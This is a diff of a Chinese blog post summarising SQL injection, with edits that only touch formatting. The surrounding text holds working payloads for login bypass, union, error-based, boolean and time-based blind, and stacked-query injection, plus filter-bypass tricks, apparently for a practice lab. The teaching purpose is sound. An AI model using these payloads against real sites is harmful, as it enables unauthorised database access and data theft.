@@ -4,11 +4,11 @@ description: "SQL 注入漏洞总结，梳理漏洞原理、利用方式、绕�
 pubDate: "2025-12-07"
 updatedDate: "2025-12-07"
 tags: ["SQL", "漏洞总结", "Web安全"]
-cover: auto
+cover: "1782887918932..jpeg"
 coverAlt: "sql注入漏洞总结 的文章封面"
 draft: false
 ---
-# SQL注入漏洞总结
+## SQL注入漏洞总结
 
 ## 什么是SQL注入漏洞
 
@@ -35,20 +35,20 @@ draft: false
 
 我们不难发现，SQL是一门与数据库密切相关的语言，数据库用来存放数据，而一些登录系统或者是查询的功能就存在一定的与数据库的交互，接下来我们看一些简单的例子
 
-```
+```sql
 SELECT * FROM users WHERE username = 'user1' AND password = 'password1';
 ```
 
 这是一个相当简单的一个查询语句，查询用户输入的内容是否在数据库中，如果用户的输入为
 
-```
+```text
 用户名： admin' --+
 密码： anything
 ```
 
 该语句就会变为
 
-```
+```sql
 SELECT * FROM users WHERE username = 'admin' --+' AND password = 'anything';
 ```
 
@@ -110,19 +110,19 @@ SQL注入一般存在这几种类型，如联合注入，报错注入，堆叠�
 
 还是上面那个例子
 
-```
+```sql
 SELECT * FROM users WHERE username = 'user1' AND password = 'password1';
 ```
 
 加入我们在user输入框处注入一个这样的语句
 
-```
+```sql
 user' union select 1,2--+
 ```
 
 当存在回显且列数正确的情况下，我们将会看到我们输入的1和2被回显了，或者只回显了其中一个，通过order by可以查询列数，如
 
-```
+```sql
 user' order by 3--+
 ```
 
@@ -130,7 +130,7 @@ user' order by 3--+
 
 既然如此我们就可以完成一系列的操作，以id形式为例，登录只需将id=后面的内容放到username栏或者password栏即可(根据具体情况修改)
 
-```
+```text
 ?id=1\(判断闭合符)
 id=1' order by 3--+(测列数)
 ?id=-1' union select 1,2,database()--+(-1没有对应字符用于显示内容，2,3可以回显，拿数据库)
@@ -148,7 +148,7 @@ group_concat拼接输出内容
 
 对于第一种我们可以通过以下方法绕过
 
-```
+```text
 1.大小写混合
 部分过滤器仅检测小写关键字，尝试：UnIoN SeLeCT
 
@@ -171,13 +171,13 @@ URL编码：UNION → %55%4E%49%4F%4E(注意url编码的适用情况)
 
 第二种则只需双写该关键字即可
 
-```
+```text
 seselectlect   ununionion  oorr  anandd
 ```
 
 空格绕过
 
-```
+```text
 union(select())
 ```
 
@@ -185,12 +185,12 @@ union(select())
 
 主要用了updatexml和extractvalue这两个函数，也可以有其他的方法，这里不主要说明，可以搜索学习一下报错注入可用函数
 
-```
+```sql
 EXTRACTVALUE(xml_frag, xpath_expr)
 UPDATEXML(xml_doc, xpath_expr, new_value)
 ```
 
-```
+```sql
 EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()),0x7e))
 0x7e：十六进制~符号，作为数据边界标识
 1：任意合法XML文档（简化形式）
@@ -207,7 +207,7 @@ UPDATEXML(1,CONCAT(0x7e,(SELECT USER()),0x7e),1)
 
 一个具体的操作示例
 
-```
+```text
 ?id=1' and (extractvalue(1,concat(0x7e,database(),0x7e)))--+
 ?id=1' and (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1))--+
 ?id=1' and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1))--+
@@ -218,7 +218,7 @@ UPDATEXML(1,CONCAT(0x7e,(SELECT USER()),0x7e),1)
 
 相当于往第二参数处注入SQL语句，我们可以利用substr来获得后一部分没有显示出来的字符
 
-```
+```text
 -  substr(...,1,31)  截取第1到31个字符
 -  substr(...,32,31)  截取第32到62个字符
 ```
@@ -229,7 +229,7 @@ UPDATEXML(1,CONCAT(0x7e,(SELECT USER()),0x7e),1)
 
 主要利用length，substr等函数进行判断，用and或者or进行拼接，以下是一个常见的流程
 
-```
+```text
 ?id=1' and length(database())=8--+(爆库长)
 ?id=1' and substr(database(),1,1)='s'--+
 ?id=1' and substr(database(),2,1)='e'--+
@@ -252,7 +252,7 @@ UPDATEXML(1,CONCAT(0x7e,(SELECT USER()),0x7e),1)
 
 与布尔盲注原理类似，不过适用于无回显
 
-```
+```text
 ?id=1' and if(1=1,sleep(5),1)--+
 判断参数构造。
 ?id=1'and if(length((select database()))>9,sleep(5),1)--+
@@ -279,7 +279,7 @@ UPDATEXML(1,CONCAT(0x7e,(SELECT USER()),0x7e),1)
 
 堆叠注入主要时利用;再开一个注入语句，类似于
 
-```
+```sql
 1';show databases;#
 1';show tables;#
 ```
